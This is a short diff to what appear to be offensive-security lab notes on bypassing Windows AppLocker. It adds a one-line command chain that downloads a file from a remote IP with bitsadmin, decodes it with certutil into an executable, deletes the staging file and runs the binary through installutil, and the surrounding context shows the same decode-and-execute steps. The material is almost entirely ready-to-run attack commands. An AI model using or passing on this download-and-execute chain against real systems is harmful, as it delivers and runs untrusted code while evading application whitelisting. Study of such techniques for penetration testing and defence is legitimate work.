@@ -44,6 +44,10 @@ certutil -decode C:\users\student\enc.txt C:\users\student\Bypass.exe
 del C:\users\student\enc.txt
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\users\student\Bypass.exe
 ```
+or
+```
+cmd /c 'bitsadmin /Transfer myJob http://192.168.49.71/file.txt C:\users\student\enc.txt && certutil -decode C:\users\student\enc.txt C:\users\student\Bypass.exe && del C:\users\student\enc.txt && C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\users\student\Bypass.exe'
+```
 # Applocker Bypass
 ## Copy to unprotected directories
 ```
